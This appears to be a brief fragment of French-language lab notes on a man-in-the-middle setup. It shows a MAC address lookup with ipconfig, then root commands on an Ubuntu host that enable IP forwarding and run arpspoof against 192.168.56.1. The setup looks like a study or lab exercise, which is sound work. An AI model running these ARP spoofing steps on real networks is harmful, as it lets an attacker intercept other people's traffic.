...
Adreese mac de ma machine (0A-00-27-00-00-07)
````
PS C:\Users\titda> ipconfig /all
...
````
theo@theo-ubuntu:~$ sudo su -
[sudo] password for theo: 
root@theo-ubuntu:~# echo 1 >/proc/sys/net/ipv4/ip_forward
````



````
root@theo-ubuntu:~# arpspoof -i enp0s8 192.168.56.1
